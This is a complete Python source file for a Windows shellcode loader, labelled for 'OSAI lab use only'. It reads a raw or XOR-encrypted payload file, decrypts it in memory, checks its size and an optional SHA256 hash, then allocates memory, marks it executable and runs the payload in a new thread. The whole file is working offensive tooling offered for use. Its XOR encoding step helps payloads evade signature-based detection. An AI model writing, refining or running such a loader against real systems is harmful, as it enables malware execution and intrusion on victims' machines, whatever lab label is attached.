#!/usr/bin/env python3
"""
Advanced Windows shellcode loader — OSAI lab use only.

Features:
  - W^X memory protection (RW alloc → copy → RX protect, never RWX)
  - Optional XOR decryption in-memory
  - SHA256 checksum verification
  - Configurable thread timeout
  - WinAPI error handling via GetLastError / FormatMessageW
  - Architecture auto-detection (x86 / x64)
  - VirtualFree cleanup in try/finally
"""

import argparse
import ctypes
import ctypes.wintypes
import hashlib
import logging
import platform
import sys
from typing import Optional

# ---------------------------------------------------------------------------
# Windows constants
# ---------------------------------------------------------------------------
MEM_COMMIT  = 0x1000
MEM_RESERVE = 0x2000
MEM_RELEASE = 0x8000

PAGE_READWRITE    = 0x04
PAGE_EXECUTE_READ = 0x20

WAIT_OBJECT_0 = 0x00000000
WAIT_TIMEOUT  = 0x00000102
WAIT_FAILED   = 0xFFFFFFFF

_FMT_FROM_SYSTEM    = 0x00001000
_FMT_IGNORE_INSERTS = 0x00000200

log = logging.getLogger(__name__)


# ---------------------------------------------------------------------------
# Platform check
# ---------------------------------------------------------------------------

def _check_windows() -> None:
    """Raise RuntimeError when not running on Windows."""
    if sys.platform != "win32":
        raise RuntimeError(
            f"This loader is Windows-only (detected platform: {sys.platform})."
        )


# ---------------------------------------------------------------------------
# Architecture detection
# ---------------------------------------------------------------------------

def _detect_architecture() -> str:
    """Detect the current process architecture and log it.

    Uses both platform.architecture() and sys.maxsize so the result reflects
    the Python process bitness, not the OS bitness.

    Returns:
        'x64' for a 64-bit process, 'x86' for a 32-bit process.
    """
    bits, _ = platform.architecture()
    arch = "x64" if sys.maxsize > 2 ** 32 else "x86"
    log.info("Architecture: %s  (%s Python process).", arch, bits)
    return arch


# ---------------------------------------------------------------------------
# WinAPI error helpers
# ---------------------------------------------------------------------------

def _format_win_error(error_code: int) -> str:
    """Translate a Windows error code into a human-readable string.

    Args:
        error_code: Value returned by GetLastError().

    Returns:
        A string like 'WinAPI error 0x00000005: Access is denied.'
    """
    k32 = ctypes.windll.kernel32
    buf = ctypes.create_unicode_buffer(512)
    k32.FormatMessageW(
        _FMT_FROM_SYSTEM | _FMT_IGNORE_INSERTS,
        None,
        error_code,
        0,
        buf,
        len(buf),
        None,
    )
    description = buf.value.strip() or "Unknown error"
    return f"WinAPI error {error_code:#010x}: {description}"


def _winapi_check(call_name: str, result: object) -> None:
    """Assert a WinAPI return value indicates success; raise on failure.

    Treats both 0 and None as failure (NULL handle / FALSE BOOL).

    Args:
        call_name: Function name used in the error message.
        result:    Return value from the ctypes call.

    Raises:
        RuntimeError: When result is falsy (0 / None / False).
    """
    if not result:
        error_code: int = ctypes.windll.kernel32.GetLastError()
        raise RuntimeError(
            f"{call_name} failed — {_format_win_error(error_code)}"
        )


# ---------------------------------------------------------------------------
# Shellcode I/O
# ---------------------------------------------------------------------------

def load_shellcode(path: str) -> bytes:
    """Read raw shellcode bytes from a binary file.

    Args:
        path: Filesystem path to the .bin file.

    Returns:
        Shellcode as a bytes object.

    Raises:
        RuntimeError: On I/O error or empty file.
    """
    try:
        with open(path, "rb") as fh:
            data = fh.read()
    except OSError as exc:
        raise RuntimeError(f"Cannot read '{path}': {exc}") from exc

    if not data:
        raise RuntimeError(f"Shellcode file '{path}' is empty.")

    log.debug("Loaded %d byte(s) from '%s'.", len(data), path)
    return data


# ---------------------------------------------------------------------------
# Validation
# ---------------------------------------------------------------------------

def validate_shellcode(
    data: bytes,
    arch: str,
    expected_checksum: Optional[str] = None,
) -> None:
    """Validate shellcode before execution.

    Checks:
      1. Minimum size (> 20 bytes) — guard against empty/truncated payloads.
      2. Architecture size heuristic — warns if the payload is suspiciously
         small for the detected architecture (not a hard stop).
      3. Optional SHA256 digest comparison.

    Args:
        data:              (Decrypted) shellcode bytes to validate.
        arch:              Detected architecture string ('x64' or 'x86').
        expected_checksum: Expected SHA256 hex digest, or None to skip.

    Raises:
        RuntimeError: On size check or checksum failure.
    """
    if len(data) <= 20:
        raise RuntimeError(
            f"Shellcode is suspiciously small ({len(data)} byte(s)); "
            "minimum accepted size is 21 bytes."
        )

    if arch == "x64" and len(data) < 64:
        log.warning(
            "Payload is only %d bytes — unusually small for x64. Verify the file.",
            len(data),
        )
    elif arch == "x86" and len(data) < 32:
        log.warning(
            "Payload is only %d bytes — unusually small for x86. Verify the file.",
            len(data),
        )

    actual = hashlib.sha256(data).hexdigest()

    if expected_checksum is not None:
        if actual.lower() != expected_checksum.lower().strip():
            raise RuntimeError(
                "SHA256 mismatch.\n"
                f"  Expected : {expected_checksum.lower().strip()}\n"
                f"  Computed : {actual}"
            )
        log.info("SHA256 verified OK  (%s).", actual)
    else:
        log.debug("SHA256 (unverified): %s", actual)


# ---------------------------------------------------------------------------
# XOR decryption
# ---------------------------------------------------------------------------

def parse_xor_key(raw: str) -> bytes:
    """Parse a hexadecimal XOR key string into bytes.

    Accepts '0xDEADBEEF', 'DEADBEEF', '0xAB', 'AB'.
    Odd-nibble strings are left-padded with a leading zero.

    Args:
        raw: Hex key from the --key CLI argument.

    Returns:
        Key as a bytes object.

    Raises:
        ValueError: If the string is not valid hex, or resolves to zero bytes.
    """
    cleaned = raw.strip().lower()
    # Python 3.8-compatible alternative to str.removeprefix('0x')
    if cleaned.startswith("0x"):
        cleaned = cleaned[2:]
    if not cleaned:
        raise ValueError(f"XOR key '{raw}' is empty after stripping '0x'.")
    if len(cleaned) % 2:
        cleaned = "0" + cleaned
    try:
        key_bytes = bytes.fromhex(cleaned)
    except ValueError as exc:
        raise ValueError(f"Invalid hex XOR key '{raw}': {exc}") from exc
    log.debug("Parsed XOR key: %s → %d byte(s).", raw, len(key_bytes))
    return key_bytes


def xor_decrypt(data: bytes, key: bytes) -> bytes:
    """XOR-decrypt shellcode in memory using a cyclic key.

    The key is repeated (rolled) to cover the full payload length.

    Args:
        data: Encrypted shellcode bytes.
        key:  Key bytes (cycled over the length of data).

    Returns:
        Decrypted shellcode as bytes.
    """
    key_len = len(key)
    out = bytearray(len(data))
    for i, byte in enumerate(data):
        out[i] = byte ^ key[i % key_len]
    log.debug("XOR-decrypted %d byte(s) with %d-byte key.", len(data), key_len)
    return bytes(out)


# ---------------------------------------------------------------------------
# Memory operations  (W^X enforced throughout)
# ---------------------------------------------------------------------------

def _configure_kernel32() -> ctypes.WinDLL:
    """Set correct argtypes / restypes on every kernel32 call we use.

    Centralising prototype setup avoids silent type-confusion bugs that would
    otherwise arise from ctypes defaulting to c_int for everything.

    Returns:
        The configured kernel32 WinDLL object.
    """
    k32 = ctypes.windll.kernel32

    k32.VirtualAlloc.restype = ctypes.c_void_p
    k32.VirtualAlloc.argtypes = [
        ctypes.c_void_p,   # lpAddress
        ctypes.c_size_t,   # dwSize
        ctypes.wintypes.DWORD,  # flAllocationType
        ctypes.wintypes.DWORD,  # flProtect
    ]

    k32.RtlMoveMemory.restype = None
    k32.RtlMoveMemory.argtypes = [
        ctypes.c_void_p,   # Destination
        ctypes.c_void_p,   # Source
        ctypes.c_size_t,   # Length
    ]

    k32.VirtualProtect.restype = ctypes.wintypes.BOOL
    k32.VirtualProtect.argtypes = [
        ctypes.c_void_p,                       # lpAddress
        ctypes.c_size_t,                       # dwSize
        ctypes.wintypes.DWORD,                 # flNewProtect
        ctypes.POINTER(ctypes.wintypes.DWORD), # lpflOldProtect
    ]

    k32.CreateThread.restype = ctypes.wintypes.HANDLE
    k32.CreateThread.argtypes = [
        ctypes.c_void_p,                       # lpThreadAttributes
        ctypes.c_size_t,                       # dwStackSize
        ctypes.c_void_p,                       # lpStartAddress
        ctypes.c_void_p,                       # lpParameter
        ctypes.wintypes.DWORD,                 # dwCreationFlags
        ctypes.POINTER(ctypes.wintypes.DWORD), # lpThreadId
    ]

    k32.WaitForSingleObject.restype = ctypes.wintypes.DWORD
    k32.WaitForSingleObject.argtypes = [
        ctypes.wintypes.HANDLE,  # hHandle
        ctypes.wintypes.DWORD,   # dwMilliseconds
    ]

    k32.CloseHandle.restype = ctypes.wintypes.BOOL
    k32.CloseHandle.argtypes = [ctypes.wintypes.HANDLE]

    k32.VirtualFree.restype = ctypes.wintypes.BOOL
    k32.VirtualFree.argtypes = [
        ctypes.c_void_p,        # lpAddress
        ctypes.c_size_t,        # dwSize  (must be 0 for MEM_RELEASE)
        ctypes.wintypes.DWORD,  # dwFreeType
    ]

    return k32


def mem_alloc_rw(k32: ctypes.WinDLL, size: int) -> int:
    """Allocate a PAGE_READWRITE region via VirtualAlloc.

    Step 1 of the W^X sequence: the region is writable but not executable.

    Args:
        k32:  Configured kernel32 DLL object.
        size: Number of bytes to allocate.

    Returns:
        Base address of the allocated region as a Python int.

    Raises:
        RuntimeError: On VirtualAlloc failure.
    """
    addr = k32.VirtualAlloc(None, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    _winapi_check("VirtualAlloc", addr)
    log.debug("VirtualAlloc: %d bytes at 0x%016x  [PAGE_READWRITE].", size, addr)
    return addr  # type: ignore[return-value]


def mem_write(k32: ctypes.WinDLL, addr: int, data: bytes) -> None:
    """Copy shellcode into the RW region via RtlMoveMemory.

    Step 2 of the W^X sequence.

    Args:
        k32:  Configured kernel32 DLL object.
        addr: Destination address (PAGE_READWRITE).
        data: Shellcode bytes to copy.
    """
    src = (ctypes.c_char * len(data)).from_buffer_copy(data)
    k32.RtlMoveMemory(addr, src, len(data))
    # RtlMoveMemory does not set GetLastError; the null-addr guard in
    # _winapi_check already fired before we reach here, so we just log.
    log.debug("RtlMoveMemory: %d bytes copied to 0x%016x.", len(data), addr)


def mem_protect_rx(k32: ctypes.WinDLL, addr: int, size: int) -> None:
    """Change the region from PAGE_READWRITE to PAGE_EXECUTE_READ via VirtualProtect.

    Step 3 of the W^X sequence: the region is now executable but no longer
    writable, enforcing the W^X invariant before execution.

    Args:
        k32:  Configured kernel32 DLL object.
        addr: Base address of the region.
        size: Region size in bytes.

    Raises:
        RuntimeError: On VirtualProtect failure.
    """
    old = ctypes.wintypes.DWORD(0)
    result = k32.VirtualProtect(addr, size, PAGE_EXECUTE_READ, ctypes.byref(old))
    _winapi_check("VirtualProtect", result)
    log.debug(
        "VirtualProtect: 0x%016x → PAGE_EXECUTE_READ  (was 0x%08x).",
        addr, old.value,
    )


def mem_free(k32: ctypes.WinDLL, addr: int) -> None:
    """Release a VirtualAlloc region via VirtualFree (MEM_RELEASE).

    Logs a warning rather than raising on failure, because this is called
    from a finally block and we don't want to mask the original exception.

    Args:
        k32:  Configured kernel32 DLL object.
        addr: Base address to release.
    """
    result = k32.VirtualFree(addr, 0, MEM_RELEASE)
    if result:
        log.debug("VirtualFree: released 0x%016x.", addr)
    else:
        error_code: int = k32.GetLastError()
        log.warning("VirtualFree failed — %s", _format_win_error(error_code))


# ---------------------------------------------------------------------------
# Thread execution
# ---------------------------------------------------------------------------

def exec_shellcode(k32: ctypes.WinDLL, addr: int, timeout_secs: int) -> None:
    """Create a thread at addr and wait up to timeout_secs for it to finish.

    Args:
        k32:          Configured kernel32 DLL object.
        addr:         Thread start address (must be PAGE_EXECUTE_READ).
        timeout_secs: Maximum seconds to wait.  0 means wait indefinitely.

    Raises:
        RuntimeError: On CreateThread failure, WaitForSingleObject failure,
                      or when the thread does not finish within the timeout.
    """
    tid = ctypes.wintypes.DWORD(0)
    thread = k32.CreateThread(None, 0, addr, None, 0, ctypes.byref(tid))
    _winapi_check("CreateThread", thread)
    log.info("Thread created — TID=%d, handle=0x%x.", tid.value, thread)

    # 0 → INFINITE (wait forever); >0 → convert to milliseconds
    timeout_ms: int = 0xFFFFFFFF if timeout_secs == 0 else timeout_secs * 1000
    log.debug("WaitForSingleObject: timeout=%d ms.", timeout_ms)

    wait_result: int = k32.WaitForSingleObject(thread, timeout_ms)
    k32.CloseHandle(thread)

    if wait_result == WAIT_TIMEOUT:
        log.warning(
            "Thread TID=%d timed out after %d second(s). "
            "The thread may still be running — increase --timeout if needed.",
            tid.value, timeout_secs,
        )
        raise RuntimeError(
            f"Shellcode thread did not finish within {timeout_secs} second(s)."
        )

    if wait_result == WAIT_FAILED:
        error_code: int = k32.GetLastError()
        raise RuntimeError(
            f"WaitForSingleObject failed — {_format_win_error(error_code)}"
        )

    log.info("Thread TID=%d completed successfully.", tid.value)


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def _build_parser() -> argparse.ArgumentParser:
    """Build and return the argument parser."""
    p = argparse.ArgumentParser(
        prog="loader.py",
        description=(
            "Advanced Windows shellcode loader — OSAI lab use only.\n"
            "Implements W^X memory protection, XOR decryption, SHA256 "
            "validation, and full WinAPI error handling."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  loader.py shellcode.bin\n"
            "  loader.py shellcode.bin --key 0xDEADBEEF --verbose\n"
            "  loader.py shellcode.bin --checksum <sha256hex> --timeout 60\n"
            "  loader.py shellcode.bin --key AB --checksum <sha256hex> --verbose\n"
        ),
    )
    p.add_argument(
        "shellcode_file",
        help="Path to the raw (or XOR-encrypted) shellcode .bin file.",
    )
    p.add_argument(
        "--key",
        metavar="HEX",
        default=None,
        help=(
            "XOR decryption key as a hex string "
            "(e.g. 0xDEADBEEF or AB). "
            "Omit to treat the input as plaintext shellcode."
        ),
    )
    p.add_argument(
        "--checksum",
        metavar="SHA256",
        default=None,
        help=(
            "Expected SHA256 hex digest of the shellcode after decryption. "
            "Omit to skip integrity verification."
        ),
    )
    p.add_argument(
        "--timeout",
        type=int,
        default=30,
        metavar="SECONDS",
        help=(
            "Seconds to wait for the shellcode thread to complete "
            "(default: 30; pass 0 to wait indefinitely)."
        ),
    )
    p.add_argument(
        "--verbose",
        action="store_true",
        help="Enable DEBUG-level log output.",
    )
    return p


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def main() -> None:
    """Parse arguments, validate, (optionally) decrypt, then execute shellcode."""
    _check_windows()

    parser = _build_parser()
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s  [%(levelname)-8s]  %(message)s",
        datefmt="%H:%M:%S",
    )

    log.info("=== Advanced Shellcode Loader — OSAI Lab ===")

    # ── Detect architecture ───────────────────────────────────────────────
    arch = _detect_architecture()

    # ── Load raw bytes from disk ──────────────────────────────────────────
    shellcode: bytes = load_shellcode(args.shellcode_file)

    # ── Optional XOR decryption ───────────────────────────────────────────
    if args.key is not None:
        xor_key = parse_xor_key(args.key)
        shellcode = xor_decrypt(shellcode, xor_key)
    else:
        log.debug("No --key supplied — treating payload as plaintext.")

    # ── Validate (size + optional SHA256) ─────────────────────────────────
    validate_shellcode(shellcode, arch, expected_checksum=args.checksum)
    log.info(
        "Shellcode ready: %d bytes, arch=%s, timeout=%d s.",
        len(shellcode), arch, args.timeout,
    )

    # ── Allocate → Copy → Protect → Execute → Free ───────────────────────
    k32 = _configure_kernel32()
    mem_addr: Optional[int] = None

    try:
        # Step 1 – RW allocation (not yet executable)
        mem_addr = mem_alloc_rw(k32, len(shellcode))

        # Step 2 – copy shellcode while region is still writable
        mem_write(k32, mem_addr, shellcode)

        # Step 3 – transition to RX: writable bit removed before first instruction
        mem_protect_rx(k32, mem_addr, len(shellcode))

        # Step 4 – run
        log.info("Dispatching shellcode thread at 0x%016x …", mem_addr)
        exec_shellcode(k32, mem_addr, args.timeout)

        log.info("Loader finished cleanly.")

    finally:
        # Step 5 – always release memory, even on exception
        if mem_addr is not None:
            mem_free(k32, mem_addr)


if __name__ == "__main__":
    try:
        main()
    except RuntimeError as exc:
        log.error("Fatal: %s", exc)
        sys.exit(1)
    except KeyboardInterrupt:
        log.warning("Interrupted by user (Ctrl+C).")
        sys.exit(130)
